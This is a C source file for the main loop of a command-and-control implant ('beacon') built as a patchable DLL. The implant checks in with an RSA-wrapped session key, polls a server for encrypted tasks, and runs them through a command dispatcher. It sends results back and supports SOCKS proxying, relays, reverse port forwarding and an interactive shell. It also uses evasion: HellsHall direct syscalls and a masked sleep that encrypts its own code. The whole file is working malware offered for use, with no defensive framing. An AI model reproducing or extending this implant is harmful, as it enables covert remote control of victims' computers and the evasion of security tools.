// Main beacon loop: checkin, then poll tasks, execute, submit output, sleep.

#include "beacon.h"

// Writable global state. artifact-gen patches these fields in the DLL image.
#pragma section(".co2cfg", read, write)
__declspec(allocate(".co2cfg"))
static BeaconState g_state = {
    .listener_key = { 0 },
    .host        = L"127.0.0.1",
    .port        = 443,
    .uri_checkin = L"/search",
    .uri_task    = L"/api/feed",
    .uri_post    = L"/submit",
    .user_agent  = L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    .metadata_cookie = L"sid",
    .spawn_to        = { 0 },
    .sleep_ms  = 2000,
    .jitter_pct= 0,
};

BeaconState* beacon_state(void) { return &g_state; }

// ---- Output queue --------------------------------------------------------
static uint8_t*  g_outbuf     = NULL;
static size_t    g_outbuf_cap = 0;
static size_t    g_outlen     = 0;
static uint64_t  g_out_task_id = 0;
static uint16_t  g_out_resp    = 0;
static int       g_out_done    = 0;

static const TransportVtbl* g_transport = NULL;
const TransportVtbl* get_transport(void) { return g_transport; }

void out_begin(uint64_t task_id, uint16_t resp) {
    g_out_task_id = task_id;
    g_out_resp    = resp;
    g_outlen      = 0;
    g_out_done    = 0;
    if (!g_outbuf) {
        g_outbuf     = (uint8_t*)bmalloc(OUT_CHUNK_BYTES);
        g_outbuf_cap = g_outbuf ? OUT_CHUNK_BYTES : 0;
    }
}

size_t out_remaining(void) {
    if (!g_outbuf || g_outbuf_cap == 0) return 0;
    return (g_outlen < g_outbuf_cap) ? (g_outbuf_cap - g_outlen) : 0;
}

void out_write(const void* data, size_t len) {
    if (!g_outbuf) return;
    if (g_outlen + len > g_outbuf_cap) len = g_outbuf_cap - g_outlen;
    if (!len) return;
    rt_memcpy(g_outbuf + g_outlen, data, len);
    g_outlen += len;
}

void out_flush_chunk(const TransportVtbl* t, uint32_t is_last) {
    if (g_out_done) return;
    if (g_outlen == 0 && !is_last) return;

    size_t kv_cap = g_outlen + 256;
    uint8_t* kvbuf = (uint8_t*)bmalloc(kv_cap);
    if (!kvbuf) { if (is_last) g_out_done = 1; return; }
    kv_reset(kvbuf, kv_cap);
    kv_put_u64("task_id", g_out_task_id);
    kv_put_u32("resp",    g_out_resp);
    kv_put_u32("is_last", is_last);
    if (g_outbuf && g_outlen)
        kv_put_bytes("output", g_outbuf, (uint32_t)g_outlen);
    size_t klen = kv_finish(NULL);

    size_t frame_cap = klen + 64;
    uint8_t* frame = (uint8_t*)bmalloc(frame_cap);
    if (frame) {
        size_t flen = seal_frame(g_state.session_key, kvbuf, klen, frame);
        if (flen && t && t->submit_output)
            t->submit_output(frame, flen);
        bfree(frame);
    }
    bfree(kvbuf);
    g_outlen = 0;
    if (is_last) g_out_done = 1;
}

void out_flush_via_transport(const TransportVtbl* t) {
    out_flush_chunk(t, 1);
}

void out_mark_done(void) {
    // Запрещает out_flush_via_transport отправлять пустой кадр после команды,
    // которая управляет своим выводом напрямую (SOCKS/relay).
    g_out_done = 1;
}

// ---- Прямая отправка кадра минуя общий выходной буфер ------------------
// Используется командами OP_SOCKS_* и OP_RELAY_* для отправки данных
// с магическим task_id, которые сервер маршрутизирует отдельно.
void transport_direct_send_typed(const TransportVtbl* t, uint64_t task_id,
                                  uint32_t resp_type,
                                  const uint8_t* data, size_t len) {
    if (!t || !t->submit_output) return;
    size_t kv_cap = (len > 0 ? len : 0) + 128;
    uint8_t* kvbuf = (uint8_t*)bmalloc(kv_cap);
    if (!kvbuf) return;
    kv_reset(kvbuf, kv_cap);
    kv_put_u64("task_id", task_id);
    kv_put_u32("resp",    resp_type);
    kv_put_u32("is_last", 1);
    if (data && len)
        kv_put_bytes("output", data, (uint32_t)len);
    size_t klen = kv_finish(NULL);
    size_t frame_cap = klen + 64;
    uint8_t* frame = (uint8_t*)bmalloc(frame_cap);
    if (frame) {
        size_t flen = seal_frame(g_state.session_key, kvbuf, klen, frame);
        if (flen) t->submit_output(frame, flen);
        bfree(frame);
    }
    bfree(kvbuf);
}

void transport_direct_send(const TransportVtbl* t, uint64_t task_id,
                           const uint8_t* data, size_t len) {
    transport_direct_send_typed(t, task_id, RESP_OUTPUT, data, len);
}

// ---- Main loop ----------------------------------------------------------
extern void beacon_main(void);

static uint32_t g_loop_delay_ms = 0; // initialised to g_state.sleep_ms in beacon_main

static void initial_checkin(const TransportVtbl* t) {
    // x86 fix: large local arrays moved to heap to avoid stack-probe-less
    // sub esp,N skipping guard pages (/Gs9999999 disables x86 stack probes;
    // x64 compiler always emits __chkstk for allocations > 4 KB regardless).
    uint8_t  wrapped[512];   // 512 B -- safe on stack
    uint32_t wrapped_len = 0;

    uint8_t* meta  = (uint8_t*)bmalloc(4096);
    uint8_t* frame = (uint8_t*)bmalloc(4608);
    uint8_t* reply = (uint8_t*)bmalloc(4608);
    uint8_t* pt    = (uint8_t*)bmalloc(4608);
    if (!meta || !frame || !reply || !pt) {
        bdbg("[beacon] checkin: bmalloc failed\n");
        bfree(meta); bfree(frame); bfree(reply); bfree(pt);
        return;
    }

    if (g_state.rsa_pub_len > 0) {
        bc_random(g_state.session_key, sizeof(g_state.session_key));
        size_t w = rsa_oaep_encrypt(g_state.rsa_pub_blob, g_state.rsa_pub_len,
                                    g_state.session_key,
                                    (uint32_t)sizeof(g_state.session_key),
                                    wrapped, sizeof(wrapped));
        if (!w) {
            bdbg("[beacon] checkin: rsa_oaep_encrypt failed; "
                 "falling back to listener_key\n");
            rt_memcpy(g_state.session_key, g_state.listener_key,
                      sizeof(g_state.session_key));
        } else {
            wrapped_len = (uint32_t)w;
        }
    } else {
        rt_memcpy(g_state.session_key, g_state.listener_key,
                  sizeof(g_state.session_key));
    }

    size_t mlen = build_metadata(meta, 4096,
                                 wrapped_len ? wrapped : NULL, wrapped_len);

    size_t flen = seal_frame(g_state.listener_key, meta, mlen, frame);
    if (!flen) {
        bdbg("[beacon] checkin: seal_frame failed\n");
        bfree(meta); bfree(frame); bfree(reply); bfree(pt);
        return;
    }

    bdbg("[beacon] checkin: calling transport->checkin\n");
    size_t rlen = 4608;
    int rc = t->checkin(frame, flen, reply, &rlen);
    if (rc != 0) {
        bdbg("[beacon] checkin: transport->checkin failed\n");
        bfree(meta); bfree(frame); bfree(reply); bfree(pt);
        return;
    }
    if (rlen == 0) {
        bdbg("[beacon] checkin: empty reply (wrong key?)\n");
        bfree(meta); bfree(frame); bfree(reply); bfree(pt);
        return;
    }

    size_t plen = open_frame(g_state.listener_key, reply, rlen, pt);
    if (!plen) {
        bdbg("[beacon] checkin: open_frame failed\n");
        bfree(meta); bfree(frame); bfree(reply); bfree(pt);
        return;
    }

    char idbuf[64];
    rt_memset(idbuf, 0, sizeof(idbuf));
    if (kv_get_str(pt, plen, "beacon_id", idbuf, sizeof(idbuf))) {
        size_t n = rt_strlen(idbuf);
        if (n > sizeof(g_state.beacon_id) - 1) n = sizeof(g_state.beacon_id) - 1;
        rt_memcpy(g_state.beacon_id, idbuf, n);
        g_state.beacon_id[n] = 0;
        g_state.checkin_done = 1;
        bdbg("[beacon] checkin: SUCCESS, got beacon_id\n");
    } else {
        bdbg("[beacon] checkin: no beacon_id in reply\n");
    }

    bfree(meta); bfree(frame); bfree(reply); bfree(pt);
}

static uint32_t apply_jitter(uint32_t base, uint8_t jpct) {
    if (!jpct) return base;
    uint8_t r; bc_random(&r, 1);
    uint32_t span = (uint32_t)base * jpct / 100u;
    uint32_t delta = span ? ((uint32_t)r * span) / 255u : 0;
    return base + delta - span / 2;
}

void beacon_main(void) {
    bdbg("[beacon] beacon_main: entered\n");

    hh_init();          // build HellsHall SSN table before any Nt*_i call

    g_loop_delay_ms = 100;

    const TransportVtbl* t = select_transport();
    g_transport = t;

    while (!g_state.quit) {
        if (!g_state.checkin_done) {
            initial_checkin(t);
            if (!g_state.checkin_done) {
                // Пауза перед повтором — не спиннить при недоступном сервере.
                Sleep(3000);
                continue;
            }
        }

        uint8_t* tframe = (uint8_t*)bmalloc(2 * 1024 * 1024);
        if (!tframe) { bdbg("[beacon] poll: bmalloc failed\n"); continue; }
        size_t tlen = 2 * 1024 * 1024;
        int rc = t->poll_tasks(tframe, &tlen);
        int had_tasks = 0;
        if (rc == 0 && tlen > 0) {
            had_tasks = 1;
            uint8_t* pt = (uint8_t*)bmalloc(2 * 1024 * 1024);
            if (!pt) { bfree(tframe); masked_sleep(g_state.sleep_ms); continue; }
            size_t plen = open_frame(g_state.session_key, tframe, tlen, pt);
            if (plen) {
                uint32_t count = 0;
                kv_get_u32(pt, plen, "count", &count);
                for (uint32_t i = 0; i < count; ++i) {
                    char kid[24], kop[24], kpay[24];
                    const char* idx;
                    char ibuf[12]; int n = 0; uint32_t v = i;
                    if (!v) ibuf[n++] = '0';
                    else { char t2[12]; int m = 0; while (v) { t2[m++] = (char)('0' + v%10); v/=10; } while (m) ibuf[n++] = t2[--m]; }
                    ibuf[n] = 0; idx = ibuf;
                    rt_memcpy(kid,  "id_",      3); rt_memcpy(kid+3,  idx, n+1);
                    rt_memcpy(kop,  "op_",      3); rt_memcpy(kop+3,  idx, n+1);
                    rt_memcpy(kpay, "payload_", 8); rt_memcpy(kpay+8, idx, n+1);

                    BeaconTask task;
                    rt_memset(&task, 0, sizeof(task));
                    kv_get_u64(pt, plen, kid, &task.id);
                    uint32_t op32 = 0;
                    kv_get_u32(pt, plen, kop, &op32);
                    task.op = (uint16_t)op32;
                    const uint8_t* pv = NULL; uint32_t pl = 0;
                    if (kv_find(pt, plen, kpay, &pv, &pl)) {
                        task.pay = (uint8_t*)pv;
                        task.pay_len = pl;
                    }
                    cmd_dispatch(&task);
                    if (task.op == OP_SLEEP) g_loop_delay_ms = g_state.sleep_ms;
                    out_flush_via_transport(t);
                    // Flush out-of-band SOCKS/relay/rportfwd data accumulated during command execution.
                    socks_flush_pending(t);
                    relay_flush_pending(t);
                    rportfwd_flush_pending(t);
                }
            } else {
                bdbg("[beacon] poll: open_frame failed\n");
            }
            bfree(pt);
        } else if (rc != 0) {
            bdbg("[beacon] poll: poll_tasks error\n");
        }
        bfree(tframe);

        // Flush pending interactive shell output (long-running commands).
        ishell_pump();

        // Flush SOCKS/relay/rportfwd data buffered since last task (e.g., spontaneous server data).
        socks_flush_pending(t);
        relay_flush_pending(t);
        rportfwd_flush_pending(t);

        if (t->connection_lost && t->connection_lost()) {
            bdbg("[beacon] connection lost, will re-checkin\n");
            g_state.checkin_done = 0;
        }

        // Relay-потоки не должны выполнять код из .text пока тот зашифрован.
        // masked_sleep сама не делает ничего при ms==0, поэтому suspend тоже
        // пропускаем — XOR не было, расшифровывать нечего.
        if (g_loop_delay_ms) {
            relay_suspend_threads();
            masked_sleep(g_loop_delay_ms);
            relay_resume_threads();
        }
    }
}
